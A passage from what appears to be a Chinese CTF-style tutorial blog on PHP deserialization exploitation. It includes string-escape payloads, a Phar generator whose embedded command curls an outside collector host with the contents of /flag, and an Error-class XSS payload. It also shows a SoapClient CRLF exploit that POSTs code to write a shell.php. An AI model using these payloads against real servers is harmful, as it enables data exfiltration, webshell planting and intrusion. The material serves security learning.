class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>问：如果我能控制进行反序列化的字符串，该如何使<code>$test2</code>的值是<code>admin</code>而不是<code>hacker</code>？</p><p>假如传入的<code>test1</code>是<code>xxx123</code>：</p><ul><li>正常情况下序列化后的字符串为<code>O:1:&quot;A&quot;:2:&#123;s:5:&quot;test1&quot;;s:6:&quot;xxx123&quot;;s:5:&quot;test2&quot;;s:6:&quot;hacker&quot;;&#125;</code></li><li>经过替换后，变成<code>O:1:&quot;A&quot;:2:&#123;s:5:&quot;test1&quot;;s:6:&quot;yyyyyy123&quot;;s:5:&quot;test2&quot;;s:6:&quot;hacker&quot;;&#125;</code></li><li>反序列化时，读取<code>yyyyyy</code>后，发现没有闭合符号，因此反序列化失败</li><li>此时发现<code>123</code>逃逸出来了，这部分是可控的。</li></ul><p>我们可以利用这可控的部分把<code>test2</code>的值改掉。</p><ul><li><p>这时候，需要先找到一个要逃逸那部分的字符串。</p></li><li><p><code>&quot;;s:5:&quot;test2&quot;;s:5:&quot;admin&quot;;&#125;</code>是我们需要逃逸的部分。最简单的判断方法是先本地序列化出一个我们想要的序列化字符串<code>O:1:&quot;A&quot;:2:&#123;s:5:&quot;test1&quot;;s:6:&quot;xxx123&quot;;s:5:&quot;test2&quot;;s:5:&quot;admin&quot;;&#125;</code>，然后以<code>xxx123</code>为分界线，取后边所有的字符串，这个字符串就是我们需要逃逸的部分。</p></li><li><p>之后统计出<code>&quot;;s:5:&quot;test2&quot;;s:5:&quot;admin&quot;;&#125;</code>的长度为27，说明我们需要逃逸27个字符。</p></li><li><p>替换函数是将<code>x</code>替换成<code>yy</code>，多出1个字符，因此输入27个<code>x</code>，就能逃逸出27个字符。</p></li><li><p>因此<code>test1</code>的值为<code>xxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;s:5:&quot;test2&quot;;s:5:&quot;admin&quot;;&#125;</code></p><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E9%80%83%E9%80%B8_1_1.png"></p></li></ul><h2 id="字符减少"><a href="#字符减少" class="headerlink" title="字符减少"></a>字符减少</h2><p>样例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$test1</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$test2</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$test3</span>=<span class="string">&quot;hacker&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$test1</span>,<span class="variable">$test2</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;test1 = <span class="variable">$test1</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;test2 = <span class="variable">$test2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;test3===<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;you get it!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;test1&#x27;</span>];</span><br><span class="line"><span class="variable">$test2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;test2&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$test1</span>,<span class="variable">$test2</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;xx&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>问：如果我能控制进行反序列化的字符串，该如何使<code>$test3</code>的值是<code>admin</code>而不是<code>hacker</code>？</p><p>假如传入的<code>test1</code>是<code>xxxxxx</code>，<code>test2</code>是<code>abc</code>：</p><ul><li>正常情况下序列化后的字符串为<code>O:1:&quot;A&quot;:3:&#123;s:5:&quot;test1&quot;;s:6:&quot;xxxxxx&quot;;s:5:&quot;test2&quot;;s:3:&quot;abc&quot;;s:5:&quot;test3&quot;;s:6:&quot;hacker&quot;;&#125;</code></li><li>经过替换后，变成<code>O:1:&quot;A&quot;:3:&#123;s:5:&quot;test1&quot;;s:6:&quot;xxx&quot;;s:5:&quot;test2&quot;;s:3:&quot;abc&quot;;s:5:&quot;test3&quot;;s:6:&quot;hacker&quot;;&#125;</code></li><li>反序列化时，读取<code>xxx&quot;;s</code>(长度为6)后，发现没有闭合符号，因此反序列化失败。</li><li>此时发现<code>&quot;;s</code>被吸收进<code>test1</code>里了，这部分是可控的，可以控制吸收多少个字符。</li></ul><p>我们可以利用这可控的部分把一些不需要的值吸收进去，再通过控制第二个变量，构造出我们想要的东西。</p><ul><li><p>需要先找到一个要逃逸那部分的字符串</p></li><li><p>方法和<code>字符变多</code>一样，先本地序列化出一个我们想要的序列化字符串<code>O:1:&quot;A&quot;:2:&#123;s:5:&quot;test1&quot;;s:6:&quot;xxx123&quot;;s:5:&quot;test2&quot;;s:3:&quot;abc&quot;;s:5:&quot;test3&quot;;s:5:&quot;admin&quot;;&#125;</code>，然后以<code>xxx123</code>为分界线，取后边所有的字符串，这个字符串就是我们需要逃逸的部分。</p></li><li><p><code>&quot;;s:5:&quot;test2&quot;;s:3:&quot;abc&quot;;s:5:&quot;test3&quot;;s:5:&quot;admin&quot;;&#125;</code>是需要逃逸的部分。</p></li><li><p>接下来找需要吸收的部分，我们需要把<code>&quot;;s:5:&quot;test2&quot;;s:3:&quot;</code>吸收进来，这里的<code>:3:</code>不是固定的，<code>3</code>是上面逃逸部分的长度（49）。（这个不是重点）</p></li><li><p>此时我们需要把<code>&quot;;s:5:&quot;test2&quot;;s:49:&quot;</code>吸收进来，让原本<code>test2</code>的值成为反序列化字符串的合法部分。</p></li><li><p>统计出<code>&quot;;s:5:&quot;test2&quot;;s:49:&quot;</code>的长度为20，说明我们需要吸收20个字符。</p></li><li><p>替换函数是将<code>xx</code>替换成<code>y</code>，减少1个字符，因此输入40个<code>x</code>，就能吸收20个字符。</p></li><li><p>因此传入<code>test1</code>的值为<code>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code>，<code>test2</code>的值为<code>&quot;;s:5:&quot;test2&quot;;N;s:5:&quot;test3&quot;;s:5:&quot;admin&quot;;&#125;</code></p><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E9%80%83%E9%80%B8_2_1.png"></p></li></ul><h1 id="Phar反序列化"><a href="#Phar反序列化" class="headerlink" title="Phar反序列化"></a>Phar反序列化</h1><p>Phar文件是php里类似于JAR的一种打包文件本质上是一种压缩文件，在PHP 5.3 或更高版本中默认开启，一个phar文件一个分为四部分</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.a stub</span><br><span class="line">    可以理解为一个标志，格式为xxx&lt;?php xxx; __HALT_COMPILER();?&gt;，前面内容不限，但必须以__HALT_COMPILER();来结尾，否则phar扩展将无法识别这个文件为phar文件</span><br><span class="line">2.a manifest describing the contents</span><br><span class="line">phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方</span><br><span class="line">3.the file contents</span><br><span class="line">被压缩文件的内容</span><br><span class="line">4.[optional] a signature for verifying Phar integrity (phar file format only)</span><br><span class="line">签名，放在文件末尾</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>生成phar文件</strong></p><p>php内置了一个Phar类来处理相关操作</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件</p><p>php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，基本上能使用伪协议的文件操作函数都能触发反序列化。</p><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/phar_1_1.png"></p><p><strong>Phar反序列化漏洞利用</strong></p><p>既然很多函数可以触发phar反序列化，那么接下来就要实际利用该漏洞</p><p>Phar反序列化不会调用 <code>weakup </code>等方法</p><p>可以在不调用<code>unserialize()</code>的情况下进行反序列化操作。</p><p><strong>漏洞利用条件</strong></p><ol><li>phar文件要能够上传到服务器端。</li><li>要有可用的魔术方法作为“跳板”。</li><li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤</li></ol><p>phar文件生成样例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;curl http://kbqsag.ceye.io/?p=`cat /flag`&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);    <span class="comment">//设置Stub</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);    <span class="comment">//设置Meta-data</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);    <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="小技巧-特性"><a href="#小技巧-特性" class="headerlink" title="小技巧&#x2F;特性"></a>小技巧&#x2F;特性</h1><h2 id="十六进制绕过关键字"><a href="#十六进制绕过关键字" class="headerlink" title="十六进制绕过关键字"></a>十六进制绕过关键字</h2><p>php反序列化是可以使用16进制的，只需要把类型小<code>s</code>改成大<code>S</code>。</p><p>样例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E7%89%B9%E6%80%A7_1_1.png"></p><p><code>t</code>的16进制是<code>\74</code>，把<code>s</code>改成<code>S</code>时，便能将<code>\74</code>解析成<code>t</code>。</p><h2 id="类名大小写不敏感"><a href="#类名大小写不敏感" class="headerlink" title="类名大小写不敏感"></a>类名大小写不敏感</h2><p>php对于类名大小写不敏感，也就是说，<code>A</code>和<code>a</code>都会认为是同一个类。</p><p>样例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;__destruct1&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E7%89%B9%E6%80%A7_2_1.png"></p><h2 id="类内方法调用"><a href="#类内方法调用" class="headerlink" title="类内方法调用"></a>类内方法调用</h2><p>样例代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;test function&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>静态调用类<code>A</code>的<code>test</code>方法:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">A::<span class="title function_ invoke__">test</span>();</span><br><span class="line"></span><br><span class="line">[<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;test&#x27;</span>]();</span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E7%89%B9%E6%80%A7_3_1.png"></p><p>动态调用类<code>A</code>的<code>test</code>方法：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>())::<span class="title function_ invoke__">test</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">test</span>();</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>())-&gt;<span class="title function_ invoke__">test</span>();</span><br><span class="line"></span><br><span class="line">[<span class="keyword">new</span> <span class="title function_ invoke__">A</span>(),<span class="string">&#x27;test&#x27;</span>]();</span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E7%89%B9%E6%80%A7_3_2.png"></p><h1 id="原生类相关"><a href="#原生类相关" class="headerlink" title="原生类相关"></a>原生类相关</h1><h2 id="C开头"><a href="#C开头" class="headerlink" title="C开头"></a>C开头</h2><p>绕 <code>wakeup</code> 和绕 <code>/^[Oa]:[/d]+/</code> 过滤。</p><p>详细可以看 <code>wakeup</code> 绕过总结的 <code>使用C绕过</code>。</p><p>以C开头的原生类：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ArrayObject::unserialize</span><br><span class="line">ArrayIterator::unserialize</span><br><span class="line">RecursiveArrayIterator::unserialize</span><br><span class="line">SplDoublyLinkedList::unserialize</span><br><span class="line">SplQueue::unserialize</span><br><span class="line">SplStack::unserialize</span><br><span class="line">SplObjectStorage::unserialize</span><br></pre></td></tr></table></figure><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><ul><li><h2 id="遍历文件目录类"><a href="#遍历文件目录类" class="headerlink" title="遍历文件目录类"></a>遍历文件目录类</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DirectoryIterator </span><br><span class="line">FilesystemIterator </span><br><span class="line">GlobIterator </span><br></pre></td></tr></table></figure><p>这三个都可以遍历文件目录，可以搭配伪协议使用。</p><p>可以用<code>glob://</code>且配合<code>*</code>查找。</p><p>注意，这几个类不能反序列化。</p><p>样例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$dir</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$a</span> )&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8E%9F%E7%94%9F%E7%B1%BB_2_1.png"></p></li><li><h2 id="读文件内容"><a href="#读文件内容" class="headerlink" title="读文件内容"></a>读文件内容</h2><p><strong>SplFileObject</strong></p><p>当用文件目录遍历到了敏感文件时，可以用<strong>SplFileObject</strong>类，<strong>SplFileInfo</strong> 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作。</p><p>样例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$text</span>= <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;./flag.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$text</span> <span class="keyword">as</span> <span class="variable">$tmp</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$tmp</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8E%9F%E7%94%9F%E7%B1%BB_2_2.png"></p></li></ul><h2 id="hash绕过和XSS实现"><a href="#hash绕过和XSS实现" class="headerlink" title="hash绕过和XSS实现"></a>hash绕过和XSS实现</h2><p>这里主要是用原生类<code>Error</code>和<code>Exception</code>来实现。</p><p>它们两个的用法是一样的，这里以<code>Error</code>类作为例子讲解</p><p>Error中也有个<code>__toString()</code>，可以控制它的内容实现字符串的输出。</p><p>Error可以传两个参数，有个参数值的不同则对象不同也就不相等，但对由于<code>__toString()</code>返回的值相同md5和sha1加密后也相同，最后得到的数据也是一样的，所以可以达到hash绕过。</p><ul><li><h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>样例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>])</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss test&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">//  O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A34%3A%22%3Cscript%3Ealert%28%27xss+test%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A27%3A%22W%3A%5Cphpstudy_pro%5CWWW%5C114.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</span></span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8E%9F%E7%94%9F%E7%B1%BB_3_1.png"></p></li><li><h2 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h2><p>样例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;test&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;test&quot;</span>,<span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> !== <span class="variable">$b</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$a != $b&#x27;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;md5相等&quot;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8E%9F%E7%94%9F%E7%B1%BB_3_2.png"></p></li></ul><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>利用<code>SoapClient</code>原生类的 <code>__call</code>方法进行<code>SSRF</code>。</p><p>使用前提：</p><ol><li>需要有soap扩展，且不是默认开启，需要手动开启</li><li>需要调用一个不存在的方法触发其__call()函数</li><li>仅限于http&#x2F;https协议</li></ol><p>正常情况下的<code>SoapClient</code>类，调用一个不存在的函数，会去调用<code>__call</code>方法。</p><p><strong>CRLF攻击</strong></p><p>什么是CRLF，其实就是回车和换行造成的漏洞，十六进制为<code>0x0d,0x0a</code> ，在HTTP当中<code>header</code>和<code>body</code>之间就是两个CRLF分割的，所以如果我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样就能注入一些会话cookie和html代码，所以crlf injection 又叫做 HTTP Response Splitting。</p><p><code>SoapClient</code> 在调用发送数据时，存在CRLF漏洞，因此我们可以通过控制其中一个http头来构造出我们想要的请求包。</p><p><code>Content-Length</code>是HTTP消息长度，它指定多少个字符，就读取多少个字符，多余的字符会被丢弃，所以可以通过控制<code>Content-Length</code>的长度，将没用的消息忽略掉。</p><p>使用SoapClient反序列化+CRLF <strong>可以生成任意POST请求</strong> 。</p><p>exp:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>;</span><br><span class="line"><span class="comment">// 填入post的数据 </span></span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;a=file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php phpinfo();?&gt;&quot;);&#x27;</span>;</span><br><span class="line"><span class="comment">// 填入你想要的http头</span></span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: aaaa=ssss&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user_agent</span> = <span class="string">&#x27;aaa^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span>=&gt; <span class="variable">$user_agent</span>,</span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span>=&gt; <span class="string">&quot;aaab&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="variable">$options</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>, <span class="string">&#x27;%0d%0a&#x27;</span>, <span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;%26&#x27;</span>, <span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$aaa</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://fushuling.com/index.php/2023/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADwakeup%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">PHP反序列化中wakeup()绕过总结</a></p><p><a href="https://xz.aliyun.com/t/11843?time__1311=mqmx0DBD9DyD2QKD/Qb5uDAhaDcC7FeD&alichlgref=https://cn.bing.com/">浅析PHP GC垃圾回收机制及常见利用方式</a></p><p><a href="https://zhuanlan.zhihu.com/p/405838002">PHP序列化冷知识</a></p><p><a 